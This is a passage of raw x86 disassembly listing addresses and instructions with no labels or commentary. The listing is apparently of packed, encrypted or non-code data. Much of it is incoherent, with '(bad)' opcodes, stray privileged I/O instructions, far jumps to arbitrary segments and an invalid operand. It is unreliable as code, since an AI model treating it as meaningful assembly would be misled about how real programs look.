  409bbc:	cmp    BYTE PTR [ecx+0x17],bl
  409bbf:	jecxz  0x409bf6
  409bc1:	pop    ecx
  409bc2:	inc    eax
  409bc3:	xchg   DWORD PTR [ebx+0x650800aa],edx
  409bc9:	adc    BYTE PTR [eax-0x4],al
  409bcc:	inc    eax
  409bcd:	fs pushf 
  409bcf:	mov    ecx,0x4339bc42
  409bd4:	cmp    DWORD PTR [ebp+edi*2+0x6],0xffffffa7
  409bd9:	adc    eax,0x5c6dde70
  409bde:	(bad)  
  409bdf:	int3   
  409be0:	fstp   QWORD PTR [ebx-0x3560d72f]
  409be6:	pop    esi
  409be7:	mov    esi,0xc8c2edf1
  409bec:	(bad)  
  409bed:	inc    ebx
  409bee:	clc    
  409bef:	push   es
  409bf0:	add    edi,DWORD PTR [ecx-0x2b]
  409bf3:	jnp    0x409bea
  409bf5:	xlat   BYTE PTR ds:[ebx]
  409bf6:	scas   al,BYTE PTR es:[edi]
  409bf7:	xchg   esp,eax
  409bf8:	xor    esi,DWORD PTR [ebp-0x27]
  409bfb:	pop    esp
  409bfc:	mov    edi,0xcc8456ed
  409c01:	frstor [ecx-0x71]
  409c04:	inc    edx
  409c05:	and    eax,DWORD PTR [ebx-0x2e]
  409c08:	ds inc eax
  409c0a:	inc    eax
  409c0b:	fst    QWORD PTR [eax]
  409c0d:	rcl    ecx,cl
  409c0f:	int    0xd7
  409c11:	xor    al,BYTE PTR [ebp+0x570093b9]
  409c17:	sub    esi,DWORD PTR [eax]
  409c19:	ss mov eax,0x7f48c9d0
  409c1f:	xlat   BYTE PTR ds:[ebx]
  409c20:	daa    
  409c21:	(bad)  
  409c22:	dec    eax
  409c23:	pop    ebx
  409c25:	fwait
  409c26:	push   0x35f318d3
  409c2b:	mov    eax,ds:0xe72e5c7b
  409c30:	cdq    
  409c31:	cmp    ch,bl
  409c33:	outs   dx,BYTE PTR ds:[esi]
  409c34:	(bad)  
  409c35:	and    DWORD PTR [edx-0x5b],esp
  409c38:	jmp    0x70a9:0x7caa5394
  409c3f:	in     al,0xd3
  409c41:	xor    eax,DWORD PTR [eax+0x64a83f36]
  409c47:	jb     0x409cbe
  409c49:	scas   al,BYTE PTR es:[edi]
  409c4a:	xor    eax,0x2b3a9cda
  409c4f:	imul   ebp,DWORD PTR [edi-0x680aecd9],0x9a1b68d1
  409c59:	imul   edi,DWORD PTR [ecx+0x9],0x44
  409c5d:	fsubr  st,st(5)
  409c5f:	pop    ebx
  409c60:	mov    DWORD PTR [eax-0x2],edi
  409c63:	mov    esi,0x3ebd443c
  409c68:	out    dx,al
  409c69:	movnti DWORD PTR [edi-0x13],edx
  409c6d:	ja     0x409c83
  409c6f:	adc    BYTE PTR [esi-0x27],al
  409c72:	test   al,0xa3
  409c74:	mov    esp,0x90e6f39
  409c79:	and    al,0x45
  409c7b:	xlat   BYTE PTR ds:[ebx]
  409c7c:	cdq    
  409c7d:	inc    edx
  409c7e:	mov    eax,ds:0x84ff8139
  409c83:	fbld   TBYTE PTR [ebp-0x31b66c9c]
  409c89:	add    DWORD PTR [edi+0x3b73c665],edx
  409c8f:	in     al,dx
  409c90:	inc    edx
  409c91:	xchg   esi,eax
  409c92:	aaa    
  409c93:	or     BYTE PTR [edi+0xdde9793],dl
  409c99:	lods   eax,DWORD PTR ds:[esi]
  409c9a:	lods   al,BYTE PTR ds:[esi]
  409c9b:	adc    ch,ch
  409c9d:	in     eax,0x32
  409c9f:	xor    eax,0xb64b55ff
  409ca4:	sbb    esi,DWORD PTR [ebx+0x27b123e5]
  409caa:	sti    
  409cab:	jge    0x409c38
  409cad:	fnstenv [edx+esi*8+0x32723aa5]
  409cb4:	and    edx,ebx
  409cb6:	aaa    
  409cb7:	pop    ds
  409cb8:	jp     0x409ce5
  409cba:	adc    edx,eax
  409cbc:	stos   BYTE PTR es:[edi],al
  409cbd:	aaa    
  409cbe:	in     eax,dx
  409cbf:	(bad)  
  409cc0:	rol    BYTE PTR [ebx],0xbc
  409cc3:	stos   BYTE PTR es:[edi],al
  409cc4:	adc    bl,BYTE PTR [ebx-0x4d]
  409cc7:	jmp    0x463d937f
  409ccc:	outs   dx,DWORD PTR ds:[esi]
  409ccd:	in     al,0x69
  409ccf:	inc    ebp
  409cd0:	aam    0xd
  409cd2:	ss jp  0x409cc9
  409cd5:	popf   
  409cd6:	mov    edi,0x3dd6d51a
  409cdb:	ins    BYTE PTR es:[edi],dx
  409cdc:	fsubp  st(0),st
  409cde:	cmp    eax,0x16b110c7
  409ce3:	and    al,0x60
  409ce5:	push   ds
  409ce6:	icebp  
  409ce7:	mov    ah,0xcc
  409ce9:	(bad)  
  409cea:	js     0x409d31
  409cec:	sub    al,0x32
  409cee:	fdiv   QWORD PTR [ebx-0x6a95c890]
  409cf4:	push   esp
  409cf5:	retf   
  409cf6:	jns    0x409d55
  409cf8:	out    dx,al
  409cf9:	aas    
  409cfa:	push   ebx
  409cfb:	repz fisubr DWORD PTR [eax-0x49]
  409cff:	out    dx,al
  409d00:	and    eax,0x57f63674
  409d05:	cmp    ah,BYTE PTR [esi]
  409d07:	pop    eax
  409d08:	test   BYTE PTR [ebp+0x2e],0xc1
  409d0c:	in     al,dx
  409d0d:	pop    edi
  409d0e:	pop    esp
  409d0f:	pop    ecx
  409d10:	xor    edx,esi
  409d12:	jns    0x409cf5
  409d14:	pop    ds
  409d15:	mov    ch,0x45
  409d17:	fcom   st(3)
  409d19:	repnz inc ebx
  409d1b:	(bad)  
  409d1e:	xchg   esi,eax
  409d1f:	lds    esi,FWORD PTR [edx]
  409d21:	stos   BYTE PTR es:[edi],al
  409d22:	popf   
  409d23:	cmp    eax,0xc6f5e79
  409d28:	mov    ds:0x10022c6a,eax
  409d2d:	mov    eax,ds:0xfbf79ac9
  409d32:	call   0xf59a:0x9e69733b
  409d39:	outs   dx,DWORD PTR ds:[esi]
  409d3a:	mov    eax,ds:0xeb0cf225
  409d3f:	int    0x3f
  409d41:	jmp    0xb5799cd
  409d46:	lahf   
  409d47:	outs   dx,DWORD PTR ds:[esi]
  409d48:	fldenv [edx+0x375ac2ba]
  409d4e:	adc    BYTE PTR [ebp+0x18],ch
  409d51:	dec    esp
  409d52:	int3   
  409d53:	out    0xd0,al
  409d55:	add    ch,dl
  409d57:	sbb    eax,0x865193bd
  409d5c:	dec    edx
  409d5d:	outs   dx,DWORD PTR ds:[esi]
  409d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d5f:	add    BYTE PTR [ebx+0x19ef9246],ch
  409d65:	retf   0x5e14
  409d68:	aad    0x54
  409d6a:	adc    cl,ch
  409d6c:	lea    ebp,[eax-0x7a]
  409d6f:	daa    
  409d70:	adc    al,0xde
  409d72:	sub    ch,BYTE PTR [edi]
  409d74:	add    al,0xa
  409d76:	cmp    eax,0xb717ef95
  409d7b:	dec    esi
  409d7c:	lock pop edx
  409d7e:	cmp    DWORD PTR [edx+ebp*1+0x16e2b116],ebp
  409d85:	repnz jmp 0xe8d6:0x83db18fe
  409d8d:	add    ebp,DWORD PTR [eax]
  409d8f:	pop    edx
  409d90:	mov    BYTE PTR [edi+0x486d5e51],ch
  409d96:	fnsave [edi+eax*8+0x0]
  409d9a:	js     0x409e04
  409d9c:	repnz push es
  409d9e:	stos   DWORD PTR es:[edi],eax
  409d9f:	lods   al,BYTE PTR ds:[esi]
  409da0:	stos   DWORD PTR es:[edi],eax
  409da1:	pushf  
  409da2:	shl    DWORD PTR [ebp-0x2b53f66b],0x26
  409da9:	ins    DWORD PTR es:[edi],dx
  409daa:	enter  0xd62,0xc6
  409dae:	cmp    BYTE PTR [edi-0x3c],dl
  409db1:	adc    edi,DWORD PTR [eax]
  409db3:	pusha  
  409db4:	mov    gs,esi
  409db6:	mov    esi,DWORD PTR [edi-0x5]
  409db9:	or     dl,BYTE PTR [ebx+ecx*1-0x5773b8e3]
  409dc0:	fimul  WORD PTR [edi]
  409dc2:	add    ah,ch
  409dc4:	mov    DWORD PTR [eax+0x30cf33c0],eax
  409dca:	xlat   BYTE PTR ds:[ebx]
  409dcb:	std    
  409dcc:	add    edx,ebp
  409dce:	pop    ds
  409dcf:	scas   al,BYTE PTR es:[edi]
  409dd0:	scas   al,BYTE PTR es:[edi]
  409dd1:	push   ecx
  409dd2:	pop    ebp
  409dd3:	ficomp WORD PTR [edi-0x2f3512d1]
  409dd9:	(bad)  
  409dda:	sahf   
  409ddb:	outs   dx,BYTE PTR ds:[esi]
  409ddc:	pop    esp
  409ddd:	mov    DWORD PTR [edi-0x5d],ecx
  409de0:	cwde   
  409de1:	cmp    DWORD PTR [ebx],ebx
  409de3:	int3   
  409de4:	loope  0x409e20
  409de6:	inc    esi
  409de7:	test   bl,cl
  409de9:	lods   al,BYTE PTR ds:[esi]
  409dea:	pause  
  409dec:	popf   
  409ded:	and    al,0xf8
  409def:	lea    esi,[eax-0x5dc3c6f8]
  409df5:	sahf   
  409df6:	(bad)  [ebx+0x26]
  409df9:	rcl    BYTE PTR ds:0xad61cc89,0xe2
  409e00:	xchg   edx,eax
  409e01:	ins    DWORD PTR es:[edi],dx
  409e02:	in     eax,dx
  409e03:	jnp    0x409dee
  409e05:	pop    esi
  409e06:	out    dx,eax
  409e07:	cmp    BYTE PTR [ebx+0x7db6c311],bh
  409e0d:	or     BYTE PTR [ebx+0x5700c525],bh
  409e13:	and    bh,BYTE PTR ds:0x898afe0e
  409e19:	pop    ds
  409e1a:	adc    cl,BYTE PTR [ebx+edx*2+0x40eb48cc]
  409e21:	mov    ebp,0x5d633a79
  409e26:	loope  0x409dec
  409e28:	xor    al,0x83
  409e2a:	int3   
  409e2b:	add    al,0xa
  409e2d:	nop
  409e2e:	mov    ecx,0x886e9ec
  409e33:	mov    ds:0x8d064432,al
  409e38:	stos   DWORD PTR es:[edi],eax
  409e39:	sub    eax,0x146363d8
  409e3e:	sub    ecx,DWORD PTR [ebx]
  409e40:	jb     0x409de4
  409e42:	sbb    eax,edi
  409e44:	data16 test al,0x3d
  409e47:	xor    eax,0x8ee37abb
  409e4c:	fs cmc 
  409e4e:	inc    ebx
  409e4f:	ins    BYTE PTR es:[edi],dx
  409e50:	sbb    ecx,ecx
  409e52:	arpl   WORD PTR [edi],ax
  409e54:	fsubr  DWORD PTR [ebx-0x59]
  409e57:	dec    DWORD PTR [eax+0x69]
  409e5a:	adc    al,0x66
  409e5c:	cmp    dl,BYTE PTR [edi+ebx*1]
  409e5f:	xor    eax,0x3a7cec63
  409e64:	call   DWORD PTR [esi+0x8]
  409e67:	bound  ebp,QWORD PTR [esi]
  409e69:	sbb    al,0xb5
  409e6b:	not    eax
  409e6d:	mov    eax,esi
  409e6f:	daa    
  409e70:	mov    ebp,0x5569db8a
  409e75:	in     eax,dx
  409e76:	mov    dl,0xa3
  409e78:	imul   ebp,DWORD PTR [edx],0xacd91e9a
  409e7e:	jne    0x409e16
  409e80:	xchg   ebp,eax
  409e81:	adc    eax,0x59c86f25
  409e86:	cmp    BYTE PTR [ebx-0x6a],al
  409e89:	adc    BYTE PTR [edx+0x2e8c6178],0x91
  409e90:	data16 xor cl,BYTE PTR [edx+0x249ff523]
  409e97:	outs   dx,DWORD PTR ds:[esi]
  409e98:	cmp    edx,ebp
  409e9a:	mov    esi,ss
  409e9c:	fwait
  409e9d:	fwait
  409e9e:	(bad)  
  409e9f:	rcr    DWORD PTR [edi],0xb9
  409ea2:	sub    dl,ah
  409ea4:	in     al,dx
  409ea5:	call   0x2c24:0x6a13625b
  409eac:	test   BYTE PTR [ebp-0x50697d8],dh
  409eb2:	loopne 0x409e73
  409eb4:	mov    dl,0xcd
  409eb6:	imul   ecx,DWORD PTR [ebx+eax*1-0x4f],0xffffff8f
  409ebb:	sub    ecx,DWORD PTR [ebp+0xc93ed9c]
  409ec1:	ds jge 0x409e9f
  409ec4:	push   ecx
  409ec5:	pop    es
  409ec6:	(bad)  
  409ec7:	fmul   st,st(6)
  409ec9:	mov    edx,0x4b69a73f
  409ece:	ss jmp 0x536c:0x4e4dad05
  409ed6:	gs inc esi
  409ed8:	add    eax,0x23b8ea37
  409edd:	pop    esp
  409ede:	jb     0x409ec4
  409ee0:	mov    DWORD PTR [edi],ebp
  409ee2:	dec    esi
  409ee3:	jmp    0x409ed5
  409ee5:	push   edx
  409ee6:	xlat   BYTE PTR ds:[ebx]
  409ee7:	adc    BYTE PTR [ebx-0x75],0x3d
  409eeb:	jo     0x409f41
  409eed:	fistp  DWORD PTR cs:[edx]
  409ef0:	jno    0x409f0a
  409ef2:	out    dx,al
  409ef3:	aaa    
  409ef4:	cmc    
  409ef5:	in     eax,dx
  409ef6:	inc    esi
  409ef7:	mov    DWORD PTR [ebx],esi
  409ef9:	pop    ds
  409efa:	shl    DWORD PTR [esp+edi*1+0x26],1
  409efe:	test   edi,0x4c7bad2e
  409f04:	and    BYTE PTR [edi],al
  409f06:	and    eax,eax
  409f08:	pop    esp
  409f09:	and    ecx,eax
  409f0b:	rcl    DWORD PTR [ebp-0x385209a7],1
  409f11:	xchg   ebx,eax
  409f12:	mov    eax,0xc0e05880
  409f17:	retf   
  409f18:	ss jbe 0x409edb
  409f1b:	mov    BYTE PTR [edi],dl
  409f1d:	xchg   edi,eax
  409f1e:	jmp    0x6132:0x8426852e
  409f25:	fisubr WORD PTR [ecx+0x20]
  409f28:	mov    dh,BYTE PTR [ecx-0x59edfb1b]
  409f2e:	scas   eax,DWORD PTR es:[edi]
  409f2f:	xor    ecx,eax
  409f31:	mov    ch,0x9b
  409f33:	retf   
  409f34:	in     eax,dx
  409f35:	ins    DWORD PTR es:[edi],dx
  409f36:	mov    esi,0x9a3db6df
  409f3b:	ret    0x9a4b
  409f3e:	mov    edi,0xd2f7cde9
  409f43:	adc    DWORD PTR [eax],ebx
  409f45:	sub    DWORD PTR [ebp+0x5207617a],edx
  409f4b:	inc    edx
  409f4c:	neg    BYTE PTR [ebp+0xec9f4f0]
  409f52:	and    BYTE PTR [esi-0x4afaa038],ch
  409f58:	or     al,0x60
  409f5a:	out    0x33,al
  409f5c:	not    BYTE PTR [eax-0x22]
  409f5f:	and    al,BYTE PTR [edi]
  409f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f62:	add    DWORD PTR [edx+eiz*2],esp
  409f65:	aam    0x68
  409f67:	jae    0x409fc9
  409f69:	inc    esp
  409f6a:	dec    edi
  409f6b:	sbb    BYTE PTR [ebx+0x705e6e6],0x19
  409f72:	out    dx,eax
  409f73:	mov    ds:0xe17b2d0a,eax
  409f78:	mov    bh,0x9d
  409f7a:	push   ecx
  409f7b:	imul   ecx,DWORD PTR [ecx+0x55480833],0xffffff86
  409f82:	pop    esp
  409f83:	mov    BYTE PTR [ecx-0x3afa969d],ch
  409f89:	push   esi
  409f8a:	lahf   
  409f8b:	jmp    0x409f8e
  409f8d:	xchg   esp,eax
  409f8e:	mov    ebp,eax
  409f90:	ins    DWORD PTR es:[edi],dx
  409f91:	pop    ebx
  409f92:	jnp    0x409f2b
  409f94:	repnz scas eax,DWORD PTR es:[edi]
  409f96:	shl    DWORD PTR [edx+0xc],1
  409f99:	and    dl,BYTE PTR ds:0x55d9e470
  409f9f:	je     0x409fc4
  409fa1:	jmp    0xfaac:0xa5ecff20
  409fa8:	pop    es
  409fa9:	mov    ecx,0x8f200d5c
  409fae:	sbb    dl,BYTE PTR [edx-0x15]
  409fb1:	add    BYTE PTR [eax],al
  409fb3:	out    dx,al
  409fb4:	outs   dx,DWORD PTR ds:[esi]
  409fb5:	adc    DWORD PTR [ebp+0x1ada83d2],esi
  409fbb:	or     eax,DWORD PTR gs:[eax-0x15]
  409fbf:	fld    TBYTE PTR ds:0x2b794417
  409fc5:	xor    DWORD PTR es:[eax-0x4c1b0c9e],esp
  409fcc:	dec    edx
  409fcd:	enter  0xbf1d,0xb4
  409fd1:	cmp    eax,edi
  409fd3:	fwait
  409fd4:	aas    
  409fd5:	scas   eax,DWORD PTR es:[edi]
  409fd6:	mov    ds:0xd88b7137,al
  409fdb:	cmp    eax,DWORD PTR [eax-0x25]
  409fde:	mov    bh,0xa5
  409fe0:	inc    eax
  409fe1:	into   
  409fe2:	mov    ds:0x56eb742e,al
  409fe7:	push   ebx
  409fe8:	dec    edx
  409fe9:	push   esi
  409fea:	loopne 0x40a041
  409fec:	pop    ebp
  409fed:	outs   dx,BYTE PTR ds:[esi]
  409fee:	sbb    al,0x18
  409ff0:	cmp    ecx,esi
  409ff2:	rcr    DWORD PTR [esi],cl
  409ff4:	or     dl,BYTE PTR [eax-0x7c]
  409ff7:	enter  0xe5cd,0x68
  409ffb:	ins    DWORD PTR es:[edi],dx
  409ffc:	stos   BYTE PTR es:[edi],al
  409ffd:	mov    dh,0xf4
  409fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a000:	xor    al,0xb7
  40a002:	sti    
  40a003:	sub    BYTE PTR ds:0x32382584,ch
  40a009:	sbb    dh,BYTE PTR [esi+ebp*2]
  40a00c:	daa    
  40a00d:	lahf   
  40a00e:	mov    edi,0xb95cca42
  40a013:	cmp    al,BYTE PTR [ecx+0x5c7a6427]
  40a019:	repz cli 
  40a01b:	inc    ebp
  40a01c:	inc    ecx
  40a01d:	sbb    BYTE PTR [eax],0xe5
  40a020:	jne    0x409fe7
  40a022:	jo     0x409ff8
  40a024:	hlt    
  40a025:	hlt    
  40a026:	retf   
  40a027:	mov    ebp,0xd9cf62ae
  40a02c:	jecxz  0x40a013
  40a02e:	mov    bh,0xdc
  40a030:	mov    eax,ds:0xac80081f
  40a035:	gs jb  0x40a007
  40a038:	out    0x5c,eax
  40a03a:	cmp    BYTE PTR [edx-0x25],dl
  40a03d:	mov    ch,0x9e
  40a03f:	add    dh,bh
  40a041:	xor    al,0xdd
  40a043:	sbb    dl,BYTE PTR [ebx+0x28]
  40a046:	jmp    0x409fff
  40a048:	jno    0x40a0ac
  40a04a:	retf   0x62ee
  40a04d:	pusha  
  40a04e:	add    dl,bh
  40a050:	test   BYTE PTR [ebx],cl
  40a052:	mov    eax,0xe4645047
  40a057:	sti    
  40a058:	stc    
  40a059:	mov    cl,dh
  40a05b:	pusha  
  40a05c:	loope  0x40a0b1
  40a05e:	fisubr DWORD PTR [ecx-0x49]
  40a061:	pop    eax
  40a062:	cmp    al,0xa8
  40a064:	fwait
  40a065:	sub    BYTE PTR [ecx+0x54],ah
  40a068:	sub    eax,0x25e86e74
  40a06d:	and    ch,BYTE PTR [esi-0x28]
  40a070:	jecxz  0x40a096
  40a072:	rol    BYTE PTR [ecx],cl
  40a074:	cmp    eax,esi
  40a076:	sbb    eax,0xfb82e45d
  40a07b:	arpl   WORD PTR [edi+0x20],ax
  40a07e:	(bad)  
  40a081:	xor    dh,0xcc
  40a084:	out    0xe9,al
  40a086:	lea    esi,[ecx]
  40a088:	dec    esp
  40a089:	imul   ebp,eax,0x40
  40a08c:	xchg   edx,eax
  40a08d:	inc    esi
  40a08e:	out    dx,al
  40a08f:	loopne 0x40a09d
  40a091:	cdq    
  40a092:	xchg   edx,eax
  40a093:	lea    eax,[ebx-0x253a771f]
  40a099:	and    cl,BYTE PTR [ebx+0x6c]
  40a09c:	sub    DWORD PTR [eax+0xb],esp
  40a09f:	lods   eax,DWORD PTR ds:[esi]
  40a0a0:	jne    0x40a0c9
  40a0a2:	push   eax
  40a0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a4:	add    ecx,ecx
  40a0a6:	leave  
  40a0a7:	and    al,0xc5
  40a0a9:	aaa    
  40a0aa:	sbb    bl,bh
  40a0ac:	jl     0x40a08d
  40a0ae:	xchg   edx,eax
  40a0af:	xor    ch,ah
  40a0b1:	lods   al,BYTE PTR ds:[esi]
  40a0b2:	push   es
  40a0b3:	test   BYTE PTR [ecx-0x6a],0xb6
  40a0b7:	add    ebp,DWORD PTR [ebp+0x63]
  40a0ba:	test   al,0x66
  40a0bc:	retf   
  40a0bd:	imul   eax,ebx,0x3f101e2
  40a0c3:	jp     0x40a11f
  40a0c5:	outs   dx,BYTE PTR ds:[esi]
  40a0c6:	inc    ecx
  40a0c7:	mov    cs:0xe6ee715d,al
  40a0cd:	ds int3 
  40a0cf:	jl     0x40a084
  40a0d1:	and    ah,ah
  40a0d3:	or     al,BYTE PTR [edi+ecx*4]
  40a0d6:	xchg   ebx,eax
  40a0d7:	imul   edx,esp,0x14
  40a0da:	sbb    eax,0xcfcef053
  40a0df:	mov    edx,0xd43379a9
  40a0e4:	ss loope 0x40a118
  40a0e7:	arpl   ax,di
  40a0e9:	gs xor eax,0x636b83b5
  40a0ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0f0:	sti    
  40a0f1:	sbb    eax,0x3531716c
  40a0f6:	icebp  
  40a0f7:	lods   al,BYTE PTR ds:[esi]
  40a0f8:	or     bl,bl
  40a0fa:	test   DWORD PTR [edx+0x361e18f4],ebp
  40a100:	or     al,0xf1
  40a102:	jno    0x40a0b2
  40a104:	mov    ds:0x7d9c0b2a,al
  40a109:	gs push ds
  40a10b:	ret    0x5766
  40a10e:	out    dx,al
  40a10f:	push   0x5dc233d6
  40a114:	pop    ecx
  40a115:	retf   0x879b
  40a118:	mov    eax,ds:0xe3d0f95b
  40a11d:	dec    ecx
  40a11e:	push   ecx
  40a11f:	cld    
  40a120:	jae    0x40a0b2
  40a122:	daa    
  40a123:	mov    DWORD PTR [ebx-0x50a92c4],eax
  40a129:	or     edi,DWORD PTR [edi]
  40a12b:	fcom   st(2)
  40a12d:	rcr    DWORD PTR [ecx+0x43b994df],1
  40a133:	ins    BYTE PTR es:[edi],dx
  40a134:	cmc    
  40a135:	int    0xb9
  40a137:	(bad)  
  40a138:	std    
  40a139:	inc    eax
  40a13a:	fsub   DWORD PTR [eax]
  40a13c:	dec    ecx
  40a13d:	and    al,0x1e
  40a13f:	jmp    0xca38c6e1
  40a144:	jo     0x40a12e
  40a146:	addr16 (bad) 
  40a148:	stos   DWORD PTR es:[edi],eax
  40a149:	adc    BYTE PTR [ebx-0x4c9eda2a],bl
  40a14f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a150:	(bad)  
  40a151:	jge    0x40a0ea
  40a153:	imul   eax,DWORD PTR [ecx+eax*1+0x517288c1],0x52
  40a15b:	iret   
  40a15c:	sbb    eax,ebx
  40a15e:	add    al,0x3a
  40a160:	aas    
  40a161:	inc    ebp
  40a162:	aas    
  40a163:	mov    bh,0x35
  40a165:	in     al,dx
  40a166:	cli    
  40a167:	in     al,0x2d
  40a169:	ror    dl,cl
  40a16b:	dec    esi
  40a16c:	call   0x419e7cc4
  40a171:	cmp    BYTE PTR [ecx+esi*4+0x373443d6],dh
  40a178:	sahf   
  40a179:	dec    ecx
  40a17a:	push   esp
  40a17b:	push   eax
  40a17c:	fcmovne st,st(0)
  40a17e:	pop    edx
  40a17f:	jmp    0x3787:0x2adc6dfc
  40a186:	sbb    DWORD PTR [ecx-0x69210bce],edx
  40a18c:	inc    ecx
  40a18d:	inc    ebx
  40a18e:	in     eax,dx
  40a18f:	dec    ebx
  40a190:	mov    esi,0xea5a7e95
  40a195:	push   0xffffffb6
  40a197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a198:	push   esp
  40a199:	adc    DWORD PTR [eax-0x51],edi
  40a19c:	jo     0x40a1b2
  40a19e:	lock cmp BYTE PTR [esi-0x9],dh
  40a1a2:	and    DWORD PTR [edx+eiz*1],ecx
  40a1a5:	add    DWORD PTR [ebx],ebx
  40a1a7:	test   DWORD PTR ds:0x1b9012f2,edi
  40a1ad:	push   0x13466a5b
  40a1b2:	lsl    ebp,WORD PTR [ebx-0x1d]
  40a1b6:	pop    ds
  40a1b7:	call   0xb216dc50
  40a1bc:	inc    edx
  40a1bd:	fxch   st(2)
  40a1bf:	and    eax,DWORD PTR [edi]
  40a1c1:	jmp    0xe69fe04
  40a1c6:	jns    0x40a167
  40a1c8:	pop    ecx
  40a1c9:	jmp    0x8b40:0xd859042d
  40a1d0:	add    ah,0x9d
  40a1d3:	lods   al,BYTE PTR ds:[esi]
  40a1d4:	add    BYTE PTR [eax],bl
  40a1d6:	(bad)  
  40a1d7:	adc    eax,0x5b86f176
  40a1dc:	jmp    0xdd3dcd8
  40a1e1:	aas    
  40a1e2:	ss and esp,ebp
  40a1e5:	adc    al,0xb6
  40a1e7:	dec    ecx
  40a1e8:	inc    ebx
  40a1e9:	xchg   dh,bl
  40a1eb:	bts    DWORD PTR ss:[edx-0x6a],eax
  40a1f0:	mov    ebx,0xe1b910e0
  40a1f5:	push   cs
  40a1f6:	or     al,0x60
  40a1f8:	mov    bl,0xab
  40a1fa:	lahf   
  40a1fb:	fbstp  TBYTE PTR [ebx]
  40a1fd:	test   ebx,eax
  40a1ff:	mov    dh,0x89
  40a201:	(bad)  
  40a203:	inc    esi
  40a204:	test   eax,0x98493e90
  40a209:	fcomip st,st(6)
  40a20b:	out    0xc9,al
  40a20d:	push   es
  40a20e:	mov    bh,0x93
  40a210:	mov    ?,WORD PTR [ebp+0x5f1433bf]
  40a216:	fnstsw WORD PTR [eax-0x27]
  40a219:	fsubr  st,st(1)
  40a21b:	push   ebx
  40a21c:	daa    
  40a21d:	ins    DWORD PTR es:[edi],dx
  40a21e:	and    BYTE PTR [edx-0x51],bh
  40a221:	inc    BYTE PTR [edi]
  40a223:	add    eax,0x65725d7
  40a228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a229:	dec    eax
  40a22a:	push   eax
  40a22b:	inc    DWORD PTR [ebx+0x3a1d99bd]
  40a231:	or     ah,0x45
  40a234:	jp     0x40a29d
  40a236:	adc    al,0xf9
  40a238:	add    esi,DWORD PTR [ecx+eax*2-0x6]
  40a23c:	or     esp,edi
  40a23e:	add    bh,al
  40a240:	das    
  40a241:	idiv   ah
  40a243:	icebp  
  40a244:	or     DWORD PTR [eax+0x1e62ff5b],edx
  40a24a:	fisubr WORD PTR [esi+0x293efa4d]
  40a250:	lock inc edi
  40a252:	int3   
  40a253:	test   eax,0x515d1993
  40a258:	xchg   ecx,eax
  40a259:	inc    esp
  40a25a:	jno    0x40a2bc
  40a25c:	jmp    0xeaabbd95
  40a261:	ss xchg ecx,eax
  40a263:	loop   0x40a278
  40a265:	data16 xor al,BYTE PTR [esi+0x6884a128]
  40a26c:	sahf   
  40a26d:	inc    esp
  40a26e:	test   DWORD PTR [esi],ecx
  40a270:	lahf   
  40a271:	sar    DWORD PTR [ebp-0x6675cd91],cl
  40a277:	sti    
  40a278:	push   ebx
  40a279:	sub    ch,BYTE PTR [ecx-0x77]
  40a27c:	xchg   BYTE PTR [eax-0x124c06f7],ch
  40a282:	push   es
  40a283:	xchg   ebp,eax
  40a284:	add    al,0x9c
  40a286:	push   esi
  40a287:	mov    bh,0x3c
  40a289:	popf   
  40a28a:	xchg   DWORD PTR [ebx],ebx
  40a28c:	inc    edi
  40a28d:	retf   
  40a28e:	cmp    ah,BYTE PTR [ebx-0x4d]
  40a291:	in     eax,dx
  40a292:	pop    es
  40a293:	jge    0x40a21f
  40a295:	sbb    DWORD PTR [esi+ebp*2],edi
  40a298:	adc    DWORD PTR [ecx-0x45f2753f],esi
  40a29e:	mov    bl,0xbd
  40a2a0:	sbb    cl,BYTE PTR [eax-0x72fbbf5f]
  40a2a6:	jb     0x40a2a8
  40a2a8:	pop    ds
  40a2a9:	cmp    bh,al
  40a2ab:	mov    dh,0xc3
  40a2ad:	xor    eax,0x7d0b6d9
  40a2b2:	gs mov eax,0xacedd41c
  40a2b8:	xor    cl,BYTE PTR [edx]
  40a2ba:	retf   
  40a2bb:	jmp    0x468b:0x3a867bab
  40a2c2:	adc    al,BYTE PTR [esi-0x693fdc3a]
  40a2c8:	jmp    0x2b58af3b
  40a2cd:	ffreep st(0)
  40a2cf:	jl     0x40a25a
  40a2d1:	xchg   ecx,eax
  40a2d2:	les    esp,FWORD PTR [ecx+ebx*4-0x49]
  40a2d6:	or     ebp,DWORD PTR [ecx]
  40a2d8:	outs   dx,BYTE PTR ds:[esi]
  40a2d9:	inc    ebp
  40a2da:	loopne 0x40a27d
  40a2dc:	jl     0x40a27b
  40a2de:	and    DWORD PTR [eax-0x6bce6b0f],ecx
  40a2e4:	hlt    
  40a2e5:	sub    al,BYTE PTR [ebp-0x143b2f4f]
  40a2eb:	int3   
  40a2ec:	jecxz  0x40a29c
  40a2ee:	imul   DWORD PTR [edi-0x13]
  40a2f1:	mov    bh,BYTE PTR [edi+0x51]
  40a2f4:	push   es
  40a2f5:	sbb    eax,0x5b605622
  40a2fa:	add    ah,BYTE PTR [edi+0x76aa5206]
  40a300:	popf   
  40a301:	arpl   WORD PTR [edi],bp
  40a303:	jp     0x40a336
  40a305:	push   ebx
  40a306:	les    esi,FWORD PTR [edi+edx*8+0x1bd78bdf]
  40a30d:	fsubr  DWORD PTR [edx-0x659d543d]
  40a313:	push   esi
  40a314:	dec    ecx
  40a315:	test   ax,0xd56e
  40a319:	push   eax
  40a31a:	sbb    BYTE PTR [ebx-0x56a61037],dh
  40a320:	push   ds
  40a321:	imul   BYTE PTR [eax-0x1c04ffb5]
  40a327:	(bad)  
  40a328:	rcl    DWORD PTR [ebx-0xf99ddbf],1
  40a32e:	(bad)  
  40a330:	dec    ebp
  40a331:	lods   al,BYTE PTR ds:[esi]
  40a332:	mov    ch,0x52
  40a334:	leave  
  40a335:	iret   
  40a336:	xor    al,BYTE PTR [ecx+0x7fb67b8f]
  40a33c:	push   0xd251a356
  40a341:	pop    esp
  40a342:	pushf  
  40a343:	shl    DWORD PTR [eax+0x50],1
  40a346:	jnp    0x40a336
  40a348:	cmp    al,al
  40a34a:	(bad)  
